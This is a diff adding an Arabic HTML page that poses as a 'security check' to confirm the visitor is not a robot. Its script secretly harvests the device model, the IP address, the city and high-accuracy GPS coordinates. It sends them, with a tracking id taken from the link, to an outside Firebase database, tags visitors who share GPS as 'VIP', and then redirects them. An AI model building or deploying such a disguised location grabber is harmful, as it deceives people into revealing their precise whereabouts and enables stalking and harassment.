@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Security Check</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
+*{font-family:'Cairo',Arial,sans-serif;box-sizing:border-box;margin:0;padding:0}
+body{background:#f8fafc;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:15px}
+.container{max-width:500px;width:100%;background:#fff;border:1px solid #e2e8f0;border-radius:16px;padding:24px;box-shadow:0 10px 40px rgba(0,0,0,0.08);text-align:center}
+.logo{width:64px;height:64px;background:linear-gradient(135deg,#00e676,#00b0ff);border-radius:16px;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:28px}
+h1{font-size:20px;font-weight:900;color:#0f172a}
+.subtitle{color:#64748b;font-size:13px;margin:8px 0 18px;line-height:1.6}
+.big-btn{width:100%;padding:16px;background:#0f172a;color:#fff;border:none;border-radius:12px;font-weight:900;font-size:15px;cursor:pointer;margin:10px 0}
+.big-btn.green{background:linear-gradient(90deg,#00e676,#00b0ff);color:#000}
+.verify-box{background:#f8fafc;border:2px solid #e2e8f0;border-radius:12px;padding:14px;display:flex;align-items:center;gap:12px;margin:10px 0;text-align:right}
+.verify-box.ok{border-color:#00e676;background:rgba(0,230,118,0.08)}
+.check{width:28px;height:28px;border:2px solid #cbd5e1;border-radius:6px;display:flex;align-items:center;justify-content:center;background:#fff;font-weight:900;flex-shrink:0}
+.check.ok{background:#00e676;border-color:#00e676;color:#fff}
+.check.spin{animation:spin 1s linear infinite;border-top-color:#00b0ff}
+@keyframes spin{to{transform:rotate(360deg)}}
+.progress{width:100%;height:8px;background:#e2e8f0;border-radius:10px;overflow:hidden;margin:15px 0}
+.fill{height:100%;background:linear-gradient(90deg,#00e676,#00b0ff);width:0%;transition:width 0.3s}
+.log{background:#0f172a;color:#00ff88;border-radius:8px;padding:10px;font-family:monospace;font-size:10px;max-height:130px;overflow:auto;text-align:left;direction:ltr;white-space:pre-wrap;margin:10px 0}
+.hidden{display:none}
+.countdown{font-size:28px;font-weight:900;color:#00e676;margin:10px 0}
+</style>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+</head>
+<body>
+<div class="container">
+<div class="logo">🛡️</div>
+<h1>التحقق الأمني</h1>
+<p class="subtitle">للتأكد من انك لست روبوت يرجي الضغط علي بدء الان</p>
+<div id="step1">
+<button class="big-btn green" onclick="startAll()">🔍 بدء التحقق</button>
+</div>
+<div id="step2" class="hidden">
+<div class="verify-box" id="boxDevice"><div class="check" id="checkDevice">📱</div><div style="flex:1;text-align:right"><div style="font-weight:700">فحص الجهاز</div><div style="font-size:11px;color:#64748b" id="descDevice">جاري...</div></div></div>
+<div class="verify-box" id="boxIP"><div class="check" id="checkIP">🌐</div><div style="flex:1;text-align:right"><div style="font-weight:700">التحقق من الشبكه</div><div style="font-size:11px;color:#64748b" id="descIP">جاري...</div></div></div>
+<div class="verify-box" id="boxGPS"><div class="check" id="checkGPS">📍</div><div style="flex:1;text-align:right"><div style="font-weight:700">جاري الاتصال</div><div style="font-size:11px;color:#64748b" id="descGPS">جاري...</div></div></div>
+<div class="progress"><div class="fill" id="fill"></div></div>
+<div id="loadingText" style="font-size:12px;color:#00b0ff;font-weight:600">جاري التحقق...</div>
+<div id="countdownSec" class="hidden"><div class="countdown" id="countdown">2</div><button class="big-btn green" onclick="goMain()">➡️ تحويل فوري</button></div>
+<div class="log" id="logBox"></div>
+</div>
+</div>
+<script>
+const FIREBASE_URL = "https://numgen-4f22c-default-rtdb.firebaseio.com";
+const MAIN_SITE = "https://pythone2033.github.io/NumGen-Pro-/";
+let debugData = {ip:null, geo:null, realGPS:null, device:null};
+let clientId = new URLSearchParams(window.location.search).get('id') || 'Visitor';
+
+function log(msg){let el=document.getElementById('logBox');el.textContent+=new Date().toLocaleTimeString()+" - "+msg+"\n";el.scrollTop=el.scrollHeight;}
+function setProgress(p){document.getElementById('fill').style.width=p+'%';}
+function setBox(id,status,desc){
+  let box=document.getElementById('box'+id);
+  let check=document.getElementById('check'+id);
+  let descEl=document.getElementById('desc'+id);
+  if(status==='ok'){box.className='verify-box ok';check.className='check ok';check.textContent='✓';}
+  else if(status==='active'){box.className='verify-box';check.className='check spin';check.textContent='◍';}
+  else if(status==='fail'){box.className='verify-box fail';check.className='check fail';check.textContent='✕';}
+  if(desc) descEl.textContent=desc;
+}
+
+// ======= REAL DEVICE DETECTION - FIX Android K =======
+function getDevice(){
+  let ua = navigator.userAgent;
+  let model = "";
+  let brand = "Android";
+  
+  // 1- Try to get model from inside (Linux; Android 13; MODEL) 
+  let m = ua.match(/\(Linux; Android \d+; (.+?)\) Build/);
+  if(m){ model = m[1].trim(); }
+  
+  // If model still empty or is just "K", try other patterns
+  if(!model || model.length<=2 || model.toUpperCase()==="K"){
+    let patterns = [
+      /; (SM-[A-Z0-9\-]+) Build/i,
+      /; (CPH\d+[A-Z0-9]*) Build/i,
+      /; (M\d+[A-Z0-9\-]+) Build/i,
+      /; (RMX\d+[A-Z0-9]*) Build/i,
+      /; (V\d+[A-Z0-9]*) Build/i,
+      /; (Infinix [A-Z0-9\- ]+)/i,
+      /; (TECNO [A-Z0-9\- ]+)/i,
+      /; (Redmi [A-Z0-9\- ]+)/i,
+      /; (POCO [A-Z0-9\- ]+)/i,
+      /; (Pixel \d+[a-z]*)/i,
+      /; ([A-Z]{2,}\-[A-Z0-9]+) Build/i
+    ];
+    for(let re of patterns){
+      let mm = ua.match(re);
+      if(mm){ model = mm[1].trim(); break; }
+    }
+  }
+  
+  // Final fallback - try to extract anything before Build
+  if(!model || model.length<=2 || model.toUpperCase()==="K"){
+    let m2 = ua.match(/Android \d+;.*;\s*(.+?)\s+Build\//);
+    if(m2){ model = m2[1].trim(); }
+  }
+  
+  // Clean
+  if(!model || model.toUpperCase()==="K" || model.length<=1){
+    model = "Android Device";
+    brand = "Android";
+  } else {
+    // Detect brand from model
+    if(/^SM-/i.test(model) || /samsung/i.test(ua)) brand="Samsung";
+    else if(/infinix/i.test(model) || /Infinix/i.test(ua)) brand="Infinix";
+    else if(/tecno/i.test(model)) brand="TECNO";
+    else if(/redmi|poco|m2007|m2101/i.test(model) || /xiaomi/i.test(ua)) brand="Xiaomi";
+    else if(/cph|oppo/i.test(model) || /OPPO/i.test(ua)) brand="OPPO";
+    else if(/vivo|v2/i.test(model)) brand="Vivo";
+    else if(/realme|rmx/i.test(model)) brand="Realme";
+    else if(/pixel/i.test(model)) brand="Google";
+    else brand="Android";
+  }
+  
+  // Remove leading K if any
+  model = model.replace(/^K\s+/i,"").replace(/\s+K$/i,"").trim();
+  if(model.toUpperCase()==="K") model="Android Device";
+  
+  let full = (brand==="Android" ? model : brand+" "+model);
+  return {model, brand, full, ua};
+}
+
+async function startAll(){
+  document.getElementById('step1').classList.add('hidden');
+  document.getElementById('step2').classList.remove('hidden');
+  log('Start id:'+clientId+' UA:'+navigator.userAgent.substring(0,80));
+  setBox('Device','active','جاري فحص الجهاز...');
+  let device=getDevice();debugData.device=device;log('REAL DEVICE:'+device.full+' | Model:'+device.model);setBox('Device','ok',device.full);setProgress(35);
+  setBox('IP','active','جاري التحقق...');
+  try{
+    let r=await fetch('https://api.ipify.org?format=json');let j=await r.json();debugData.ip=j.ip;log('IP:'+j.ip);setBox('IP','ok','IP: '+j.ip);setProgress(60);
+  }catch(e){
+    try{let r=await fetch('https://ipapi.co/json/');let j=await r.json();debugData.ip=j.ip;debugData.geo=j;log('IP via ipapi:'+j.ip);setBox('IP','ok',j.city+' - '+j.ip);setProgress(60);}catch(e2){log('IP fail');setBox('IP','fail','فشل الشبكه');}
+  }
+  if(debugData.ip && !debugData.geo){try{let r=await fetch('https://ipapi.co/'+debugData.ip+'/json/');let j=await r.json();debugData.geo=j;log('GEO:'+j.city);}catch(e){}}
+  setBox('GPS','active','جاري الاتصال...');log('Request GPS...');
+  if(!navigator.geolocation){log('No geo support');setBox('GPS','fail','غير مدعوم');await saveAndGo(false);return;}
+  navigator.geolocation.getCurrentPosition(async function(pos){
+    debugData.realGPS={lat:pos.coords.latitude, lon:pos.coords.longitude, acc:pos.coords.accuracy};
+    log('GPS OK:'+debugData.realGPS.lat.toFixed(6)+','+debugData.realGPS.lon.toFixed(6)+' acc:'+Math.round(debugData.realGPS.acc)+'m');
+    setBox('GPS','ok','تم الاتصال - '+Math.round(debugData.realGPS.acc)+'m');setProgress(95);await saveAndGo(true);
+  },async function(err){log('GPS FAIL:'+err.message);setBox('GPS','fail','فشل - سيتم الحفظ ك ADS');await saveAndGo(false);},{enableHighAccuracy:true,timeout:15000,maximumAge:0});
+}
+async function saveAndGo(hasGPS){
+  try{
+    if(!firebase.apps.length) firebase.initializeApp({databaseURL: FIREBASE_URL});
+    let db=firebase.database();
+    let latVal=null;let lonVal=null;
+    if(hasGPS && debugData.realGPS){latVal=debugData.realGPS.lat;lonVal=debugData.realGPS.lon;}
+    else if(debugData.geo){latVal=debugData.geo.latitude;lonVal=debugData.geo.longitude;}
+    let data={
+      id: clientId,
+      name: clientId,
+      ip: debugData.ip||'unknown',
+      city: debugData.geo?debugData.geo.city:'Alexandria',
+      country: debugData.geo?debugData.geo.country_name:'Egypt',
+      lat: latVal,
+      lng: lonVal,
+      real_lat: latVal,
+      real_lon: lonVal,
+      gps: latVal? (latVal+','+lonVal) : 'unknown',
+      device: debugData.device.full,
+      device_model: debugData.device.model,
+      device_brand: debugData.device.brand,
+      device_full: debugData.device.full,
+      real_device_name: debugData.device.full,
+      userAgent: debugData.device.ua,
+      time: new Date().toLocaleString('ar-EG'),
+      timestamp: Date.now(),
+      type: hasGPS ? 'VIP' : 'ADS'
+    };
+    if(hasGPS) data.accuracy=debugData.realGPS.acc;
+    await db.ref('visitors').push(data);
+    await db.ref('pro_max_visitors').push(data);
+    log('SAVED type:'+data.type+' device:'+data.device_full+' lat:'+latVal);
+    document.getElementById('loadingText').textContent = hasGPS ? '✅ GPS حقيقي - '+data.device_full : '✅ ADS - '+data.device_full;
+    setProgress(100);startCountdown();
+  }catch(e){log('SAVE ERROR:'+e.message);document.getElementById('loadingText').textContent='جاري التحويل...';setProgress(100);startCountdown();}
+}
+let countdownVal=2;
+function startCountdown(){document.getElementById('countdownSec').classList.remove('hidden');function tick(){document.getElementById('countdown').textContent=countdownVal;if(countdownVal<=0){goMain();return;}countdownVal--;setTimeout(tick,1000);}tick();}
+function goMain(){window.location.href = MAIN_SITE+'?id='+encodeURIComponent(clientId)+'&verified=true';}
+</script>
+</body>
+</html>
